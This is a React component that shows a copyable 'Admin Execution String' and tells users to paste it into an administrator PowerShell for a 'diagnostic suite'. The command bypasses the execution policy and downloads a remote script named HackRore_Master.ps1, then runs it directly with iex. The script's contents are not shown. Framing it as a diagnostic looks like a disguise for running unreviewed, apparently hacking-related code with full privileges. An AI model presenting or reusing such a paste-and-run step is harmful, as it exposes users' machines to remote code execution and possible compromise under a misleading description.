import { useState } from 'react';
import { Terminal, Copy, Check } from 'lucide-react';

export default function CommandCenter() {
  const [copied, setCopied] = useState(false);
  const command = `powershell -ExecutionPolicy Bypass -Command "iex (irm https://hachtool.vercel.app/scripts/HackRore_Master.ps1)"`;

  const copyToClipboard = () => {
    navigator.clipboard.writeText(command);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="bg-slate-900 rounded-lg p-6 border border-slate-700 shadow-xl mt-8">
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center gap-2 text-blue-400">
          <Terminal size={20} />
          <span className="font-mono text-sm font-bold uppercase tracking-wider">Admin Execution String</span>
        </div>
        <button 
          onClick={copyToClipboard}
          className="flex items-center gap-2 bg-slate-800 hover:bg-slate-700 text-white px-3 py-1.5 rounded-md transition-all text-xs border border-slate-600"
        >
          {copied ? <Check size={14} className="text-green-400" /> : <Copy size={14} />}
          {copied ? 'Copied!' : 'Copy Code'}
        </button>
      </div>
      <div className="bg-black/50 p-4 rounded border border-slate-800">
        <code className="text-blue-100 font-mono text-sm break-all">
          {command}
        </code>
      </div>
      <p className="text-slate-400 text-xs mt-3 italic">
        * Paste this into PowerShell (Admin) to run the full diagnostic suite without downloading files.
      </p>
    </div>
  );
}

